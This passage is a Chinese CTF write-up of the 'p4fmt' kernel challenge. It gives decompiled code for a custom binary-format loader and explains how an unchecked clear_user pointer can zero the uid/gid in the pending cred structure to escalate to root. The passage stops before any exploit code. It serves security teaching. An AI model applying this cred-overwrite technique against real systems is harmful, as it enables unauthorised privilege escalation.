<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<p>p4举办的一场比赛<br/>
主要分析一下其中的一道Kernel PWN<br/>
题目不算难，但很适合内核入门</p>
<h2 data-content="1" id="ebab26c5836ac5ca9309e5eff487d54c">p4fmt</h2>
<h3 data-content="1" id="bd9416141bab970c4c30e67cbe2595e3">Analyze</h3>
<p>拿到题目，解压后一共三个文件：</p>
<pre><code>bzImage#内核映像
initramfs.cpio.gz#文件系统
run.sh#qemu启动脚本</code></pre>
<p>qemu启动脚本启动后看到：</p>
<pre><code>====================
p4fmt
====================

Kernel challs are always a bit painful.
No internet access, no SSH, no file copying.

You're stuck with copy pasting base64'd (sometimes static) ELFs.
But what if there was another solution?

We've created a lightweight, simple binary format for your
pwning pleasure. It's time to prove your skills.</code></pre>
<p>根据信息，是一道kernel pwn，flag在根目录，但是只有root可读，需要我们提升权限<br/>
且内部定义了一种可执行文件格式<br/>
查看文件系统的init脚本：</p>
<pre><code>#!/bin/sh

mount -t proc none /proc
mount -t sysfs none /sys
insmod  /p4fmt.ko  

sleep 2

ln -s /dev/console /dev/ttyS0

cat &lt;&lt;EOF
====================
p4fmt
====================

Kernel challs are always a bit painful.
No internet access, no SSH, no file copying.

You're stuck with copy pasting base64'd (sometimes static) ELFs.
But what if there was another solution?

We've created a lightweight, simple binary format for your
pwning pleasure. It's time to prove your skills.

EOF

setsid cttyhack su pwn
poweroff -f</code></pre>
<p>注意两个地方：</p>
<pre><code>insmod  /p4fmt.ko   加载了p4fmt模块
setsid cttyhack su pwn  以pwn用户启动</code></pre>
<p>首先提取p4fmt模块binary：</p>
<pre><code>gunzip ./initramfs.cpio.gz
cpio -idmv &lt; initramfs.cpio</code></pre>
<p>拿到文件后，ida分析<br/>
看到其定义的p4fmt可执行文件格式以及载入过程：</p>
<div class="highlight"><pre><span></span><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">load_p4_binary</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">signed</span> <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rcx</span>
  <span class="n">_BYTE</span> <span class="o">*</span><span class="n">v2</span><span class="p">;</span> <span class="c1">// rsi</span>
  <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// r12</span>
  <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// rbx</span>
  <span class="n">_BYTE</span> <span class="o">*</span><span class="n">v5</span><span class="p">;</span> <span class="c1">// rdi</span>
  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// r14</span>
  <span class="kt">bool</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// cf</span>
  <span class="kt">bool</span> <span class="n">v8</span><span class="p">;</span> <span class="c1">// zf</span>
  <span class="kr">__int64</span> <span class="n">v9</span><span class="p">;</span> <span class="c1">// r13</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// ebp</span>
  <span class="kt">char</span> <span class="n">v12</span><span class="p">;</span> <span class="c1">// al</span>
  <span class="kt">signed</span> <span class="kr">__int64</span> <span class="n">v13</span><span class="p">;</span> <span class="c1">// r12</span>
  <span class="kt">signed</span> <span class="kr">__int64</span> <span class="n">v14</span><span class="p">;</span> <span class="c1">// rsi</span>
  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v15</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="n">map_info</span> <span class="o">*</span><span class="n">v16</span><span class="p">;</span> <span class="c1">// r12</span>
  <span class="kr">__int64</span> <span class="n">v17</span><span class="p">;</span> <span class="c1">// ST00_8</span>
  <span class="kt">signed</span> <span class="kr">__int64</span> <span class="n">v18</span><span class="p">;</span> <span class="c1">// r14</span>
  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v19</span><span class="p">;</span> <span class="c1">// r15</span>
  <span class="kr">__int64</span> <span class="n">v20</span><span class="p">;</span> <span class="c1">// r9</span>
  <span class="kr">__int64</span> <span class="n">v21</span><span class="p">;</span> <span class="c1">// rdx</span>
  <span class="kr">__int64</span> <span class="n">v22</span><span class="p">;</span> <span class="c1">// rcx</span>
  <span class="kr">__int64</span> <span class="n">v23</span><span class="p">;</span> <span class="c1">// r8</span>

  <span class="n">v1</span> <span class="o">=</span> <span class="mi">2LL</span><span class="p">;</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fmt_header</span><span class="p">;</span>
  <span class="n">v3</span> <span class="o">=</span> <span class="n">a1</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">;</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="n">a1</span><span class="p">;</span>
  <span class="n">v5</span> <span class="o">=</span> <span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">);</span>
  <span class="n">v6</span> <span class="o">=</span> <span class="n">__readgsqword</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">current_task</span><span class="p">);</span>
  <span class="n">v7</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">v8</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">v9</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v6</span> <span class="o">+</span> <span class="mh">0x2A0</span><span class="p">);</span>
  <span class="k">do</span>                                            <span class="c1">// cmp headers</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v1</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="n">v7</span> <span class="o">=</span> <span class="o">*</span><span class="n">v2</span> <span class="o">&lt;</span> <span class="o">*</span><span class="n">v5</span><span class="p">;</span>
    <span class="n">v8</span> <span class="o">=</span> <span class="o">*</span><span class="n">v2</span><span class="o">++</span> <span class="o">==</span> <span class="o">*</span><span class="n">v5</span><span class="o">++</span><span class="p">;</span>
    <span class="o">--</span><span class="n">v1</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">while</span> <span class="p">(</span> <span class="n">v8</span> <span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="o">!</span><span class="n">v7</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">v8</span><span class="p">)</span> <span class="o">!=</span> <span class="n">v7</span> <span class="p">)</span>
    <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="o">-</span><span class="mi">8</span><span class="p">;</span>
  <span class="n">JUMPOUT</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mh">0x4A</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">load_p4_binary_cold_2</span><span class="p">);</span><span class="c1">// cmp \x00-&gt;version</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mh">0x4B</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1u</span> <span class="p">)</span>
    <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="o">-</span><span class="mi">22</span><span class="p">;</span>
  <span class="n">v10</span> <span class="o">=</span> <span class="n">flush_old_exec</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="n">v2</span><span class="p">);</span>                 <span class="c1">// clear the environment</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v10</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v6</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x800000</span><span class="p">;</span>
    <span class="n">setup_new_exec</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span>
    <span class="n">v12</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mh">0x4B</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v12</span> <span class="p">)</span>                                  <span class="c1">// type=1</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v12</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
        <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="o">-</span><span class="mi">22</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mh">0x4C</span><span class="p">)</span> <span class="p">)</span>             <span class="c1">// map_time</span>
      <span class="p">{</span>
        <span class="n">v16</span> <span class="o">=</span> <span class="p">(</span><span class="n">map_info</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">)</span> <span class="o">+</span> <span class="n">v3</span><span class="p">);</span><span class="c1">// map_info_offset</span>
        <span class="k">do</span>
        <span class="p">{</span>
          <span class="n">v17</span> <span class="o">=</span> <span class="n">v16</span><span class="o">-&gt;</span><span class="n">load_addr</span><span class="p">;</span>
          <span class="n">v18</span> <span class="o">=</span> <span class="n">v16</span><span class="o">-&gt;</span><span class="n">load_addr</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">;</span>
          <span class="n">v19</span> <span class="o">=</span> <span class="n">v16</span><span class="o">-&gt;</span><span class="n">load_addr</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFF000LL</span><span class="p">;</span>
          <span class="n">printk</span><span class="p">(</span>
            <span class="s">"vm_mmap(load_addr=0x%llx, length=0x%llx, offset=0x%llx, prot=%d)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
            <span class="n">v19</span><span class="p">,</span>
            <span class="n">v16</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">,</span>
            <span class="n">v16</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">,</span>
            <span class="n">v18</span><span class="p">);</span>
          <span class="n">v20</span> <span class="o">=</span> <span class="n">v16</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">;</span>
          <span class="n">v21</span> <span class="o">=</span> <span class="n">v16</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span> <span class="n">v17</span> <span class="o">&amp;</span> <span class="mi">8</span> <span class="p">)</span>
          <span class="p">{</span>
            <span class="n">vm_mmap</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="n">v19</span><span class="p">,</span> <span class="n">v21</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">v18</span><span class="p">,</span> <span class="mi">2LL</span><span class="p">,</span> <span class="n">v20</span><span class="p">);</span>
            <span class="n">printk</span><span class="p">(</span><span class="s">"clear_user(addr=0x%llx, length=0x%llx)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">v16</span><span class="o">-&gt;</span><span class="n">load_addr</span><span class="p">,</span> <span class="n">v16</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">,</span> <span class="n">v22</span><span class="p">,</span> <span class="n">v23</span><span class="p">);</span>
            <span class="n">_clear_user</span><span class="p">(</span><span class="n">v16</span><span class="o">-&gt;</span><span class="n">load_addr</span><span class="p">,</span> <span class="n">v16</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">);</span>
          <span class="p">}</span>
          <span class="k">else</span>
          <span class="p">{</span>
            <span class="n">vm_mmap</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">8</span><span class="p">),</span> <span class="n">v19</span><span class="p">,</span> <span class="n">v21</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">v18</span><span class="p">,</span> <span class="mi">2LL</span><span class="p">,</span> <span class="n">v20</span><span class="p">);</span>
          <span class="p">}</span>
          <span class="o">++</span><span class="n">v10</span><span class="p">;</span>
          <span class="o">++</span><span class="n">v16</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">while</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mh">0x4C</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">v10</span> <span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">else</span>                                        <span class="c1">//type=0</span>
    <span class="p">{</span>
      <span class="n">v13</span> <span class="o">=</span> <span class="o">-</span><span class="mi">12LL</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="n">vm_mmap</span><span class="p">(</span>
                               <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">8</span><span class="p">),</span>
                               <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">80</span><span class="p">),</span>
                               <span class="mi">4096LL</span><span class="p">,</span>
                               <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">80</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">7LL</span><span class="p">,</span>
                               <span class="mi">2LL</span><span class="p">,</span>
                               <span class="mi">0LL</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mh">0xFFFFFFFFFFFFF000LL</span> <span class="p">)</span>
      <span class="p">{</span>
<span class="nl">LABEL_12</span><span class="p">:</span>
        <span class="n">install_exec_creds</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span>
        <span class="n">set_binfmt</span><span class="p">(</span><span class="o">&amp;</span><span class="n">p4format</span><span class="p">);</span>
        <span class="n">v14</span> <span class="o">=</span> <span class="mh">0x7FFFFFFFF000LL</span><span class="p">;</span>
        <span class="n">v15</span> <span class="o">=</span> <span class="n">__readgsqword</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">current_task</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v15</span> <span class="o">&amp;</span> <span class="mh">0x20000000</span> <span class="p">)</span>
        <span class="p">{</span>
          <span class="n">v14</span> <span class="o">=</span> <span class="mh">0xC0000000LL</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">v15</span> <span class="o">+</span> <span class="mi">131</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">8</span><span class="p">)</span> <span class="p">)</span>
            <span class="n">v14</span> <span class="o">=</span> <span class="mh">0xFFFFE000LL</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">v10</span> <span class="o">=</span> <span class="n">setup_arg_pages</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="n">v14</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v10</span> <span class="p">)</span>
        <span class="p">{</span>
          <span class="n">finalize_exec</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span>
          <span class="n">start_thread</span><span class="p">(</span>
            <span class="n">v9</span> <span class="o">+</span> <span class="mi">16216</span><span class="p">,</span>
            <span class="n">v13</span><span class="p">,</span>
            <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">__readgsqword</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">current_task</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x28LL</span><span class="p">));</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="n">v10</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">v13</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">88</span><span class="p">);</span>
    <span class="k">goto</span> <span class="n">LABEL_12</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">v10</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
<p>可以看到：<br/>
首先检验文件头是否为"P4"以及version是否为0<br/>
而后调用一次flush_old_exec清理空间<br/>
而后通过version后一字节判断type来确定加载方式<br/>
注意到第一种加载方式：</p>
<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span> <span class="n">v12</span> <span class="p">)</span>                                  <span class="c1">// type=1</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v12</span> <span class="o">!=</span> <span class="mi">1</span> <span class="p">)</span>
        <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="o">-</span><span class="mi">22</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mh">0x4C</span><span class="p">)</span> <span class="p">)</span>             <span class="c1">// map_time</span>
      <span class="p">{</span>
        <span class="n">v16</span> <span class="o">=</span> <span class="p">(</span><span class="n">map_info</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">)</span> <span class="o">+</span> <span class="n">v3</span><span class="p">);</span><span class="c1">// map_info_offset</span>
        <span class="k">do</span>
        <span class="p">{</span>
          <span class="n">v17</span> <span class="o">=</span> <span class="n">v16</span><span class="o">-&gt;</span><span class="n">load_addr</span><span class="p">;</span>
          <span class="n">v18</span> <span class="o">=</span> <span class="n">v16</span><span class="o">-&gt;</span><span class="n">load_addr</span> <span class="o">&amp;</span> <span class="mi">7</span><span class="p">;</span>
          <span class="n">v19</span> <span class="o">=</span> <span class="n">v16</span><span class="o">-&gt;</span><span class="n">load_addr</span> <span class="o">&amp;</span> <span class="mh">0xFFFFFFFFFFFFF000LL</span><span class="p">;</span>
          <span class="n">printk</span><span class="p">(</span>
            <span class="s">"vm_mmap(load_addr=0x%llx, length=0x%llx, offset=0x%llx, prot=%d)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
            <span class="n">v19</span><span class="p">,</span>
            <span class="n">v16</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">,</span>
            <span class="n">v16</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">,</span>
            <span class="n">v18</span><span class="p">);</span>
          <span class="n">v20</span> <span class="o">=</span> <span class="n">v16</span><span class="o">-&gt;</span><span class="n">offset</span><span class="p">;</span>
          <span class="n">v21</span> <span class="o">=</span> <span class="n">v16</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span> <span class="n">v17</span> <span class="o">&amp;</span> <span class="mi">8</span> <span class="p">)</span>
          <span class="p">{</span>
            <span class="n">vm_mmap</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="n">v19</span><span class="p">,</span> <span class="n">v21</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">v18</span><span class="p">,</span> <span class="mi">2LL</span><span class="p">,</span> <span class="n">v20</span><span class="p">);</span>
            <span class="n">printk</span><span class="p">(</span><span class="s">"clear_user(addr=0x%llx, length=0x%llx)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">v16</span><span class="o">-&gt;</span><span class="n">load_addr</span><span class="p">,</span> <span class="n">v16</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">,</span> <span class="n">v22</span><span class="p">,</span> <span class="n">v23</span><span class="p">);</span>
            <span class="n">_clear_user</span><span class="p">(</span><span class="n">v16</span><span class="o">-&gt;</span><span class="n">load_addr</span><span class="p">,</span> <span class="n">v16</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">);</span>
          <span class="p">}</span>
          <span class="k">else</span>
          <span class="p">{</span>
            <span class="n">vm_mmap</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mi">8</span><span class="p">),</span> <span class="n">v19</span><span class="p">,</span> <span class="n">v21</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">v18</span><span class="p">,</span> <span class="mi">2LL</span><span class="p">,</span> <span class="n">v20</span><span class="p">);</span>
          <span class="p">}</span>
          <span class="o">++</span><span class="n">v10</span><span class="p">;</span>
          <span class="o">++</span><span class="n">v16</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">while</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mh">0x4C</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">v10</span> <span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
</pre></div>
<p>首先会通过type后一字节决定操作次数<br/>
而后通过一个map_info结构体来调用vm_mmap和clear_user<br/>
其中会把调用参数通过printk输出<br/>
map_info:</p>
<pre><code>00000000 map_info        struc ; (sizeof=0x18, mappedto_3)
00000000 load_addr       dq ?
00000008 length          dq ?
00000010 offset          dq ?
00000018 map_info        ends</code></pre>
<p>同时可以看到：</p>
<div class="highlight"><pre><span></span><span class="nl">LABEL_12</span><span class="p">:</span>
        <span class="n">install_exec_creds</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span>
        <span class="n">set_binfmt</span><span class="p">(</span><span class="o">&amp;</span><span class="n">p4format</span><span class="p">);</span>
        <span class="n">v14</span> <span class="o">=</span> <span class="mh">0x7FFFFFFFF000LL</span><span class="p">;</span>
        <span class="n">v15</span> <span class="o">=</span> <span class="n">__readgsqword</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">current_task</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v15</span> <span class="o">&amp;</span> <span class="mh">0x20000000</span> <span class="p">)</span>
        <span class="p">{</span>
          <span class="n">v14</span> <span class="o">=</span> <span class="mh">0xC0000000LL</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="n">v15</span> <span class="o">+</span> <span class="mi">131</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">8</span><span class="p">)</span> <span class="p">)</span>
            <span class="n">v14</span> <span class="o">=</span> <span class="mh">0xFFFFE000LL</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">v10</span> <span class="o">=</span> <span class="n">setup_arg_pages</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="n">v14</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v10</span> <span class="p">)</span>
        <span class="p">{</span>
          <span class="n">finalize_exec</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span>
          <span class="n">start_thread</span><span class="p">(</span>
            <span class="n">v9</span> <span class="o">+</span> <span class="mi">16216</span><span class="p">,</span>
            <span class="n">v13</span><span class="p">,</span>
            <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">__readgsqword</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">current_task</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x28LL</span><span class="p">));</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="n">v10</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">v13</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">v4</span> <span class="o">+</span> <span class="mh">0x58</span><span class="p">);</span>
    <span class="k">goto</span> <span class="n">LABEL_12</span><span class="p">;</span>
</pre></div>
<p>程序会以文件偏移0x58-0x48=0x10处的值作为程序入口点<br/>
而后执行： install_exec_creds:</p>
<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">install_exec_creds</span><span class="p">(</span><span class="k">struct</span> <span class="n">linux_binprm</span> <span class="o">*</span><span class="n">bprm</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">security_bprm_committing_creds</span><span class="p">(</span><span class="n">bprm</span><span class="p">);</span>

    <span class="n">commit_creds</span><span class="p">(</span><span class="n">bprm</span><span class="o">-&gt;</span><span class="n">cred</span><span class="p">);</span>
    <span class="n">bprm</span><span class="o">-&gt;</span><span class="n">cred</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">get_dumpable</span><span class="p">(</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">mm</span><span class="p">)</span> <span class="o">!=</span> <span class="n">SUID_DUMP_USER</span><span class="p">)</span>
        <span class="n">perf_event_exit_task</span><span class="p">(</span><span class="n">current</span><span class="p">);</span>

    <span class="n">security_bprm_committed_creds</span><span class="p">(</span><span class="n">bprm</span><span class="p">);</span>
    <span class="n">mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">signal</span><span class="o">-&gt;</span><span class="n">cred_guard_mutex</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
<p>所以可执行文件整体格式:</p>
<pre><code>"P4\x00"
(char)type
(int)map_info_num
(long)map_info_offset
(long)entry
((map_info struct)map_info)*map_info_num
the_code_will_exec</code></pre>
<p>因此我们需要想办法使我们的最后code运行在root身份下<br/>
此时code只需执行shell或者直接读取/flag操作即可<br/>
注意到加载过程中根据map_info程序会有clear_user操作：</p>
<div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span> <span class="n">v17</span> <span class="o">&amp;</span> <span class="mi">8</span> <span class="p">)</span>
          <span class="p">{</span>
            <span class="n">vm_mmap</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="n">v19</span><span class="p">,</span> <span class="n">v21</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kr">__int8</span><span class="p">)</span><span class="n">v18</span><span class="p">,</span> <span class="mi">2LL</span><span class="p">,</span> <span class="n">v20</span><span class="p">);</span>
            <span class="n">printk</span><span class="p">(</span><span class="s">"clear_user(addr=0x%llx, length=0x%llx)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">v16</span><span class="o">-&gt;</span><span class="n">load_addr</span><span class="p">,</span> <span class="n">v16</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">,</span> <span class="n">v22</span><span class="p">,</span> <span class="n">v23</span><span class="p">);</span>
            <span class="n">_clear_user</span><span class="p">(</span><span class="n">v16</span><span class="o">-&gt;</span><span class="n">load_addr</span><span class="p">,</span> <span class="n">v16</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">);</span>
          <span class="p">}</span>
</pre></div>
<p><strong>但是程序并没有检测此处指针<br/>
根据前面的 install_exec_creds，程序会根据commit_creds(bprm-&gt;cred)来设置线程权限<br/>
因此我们可以传入clear_user一个指针指向此cred结构体特定位置来覆盖uid和gid来提升线程权限,而后commit_creds(bprm-&gt;cred)即会根据我们覆盖后的fake_cred来设置线程权限执行我们的code</strong><br/>
<strong>关于linux_binprm：</strong></p>
<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">linux_binprm</span> <span class="p">{</span>
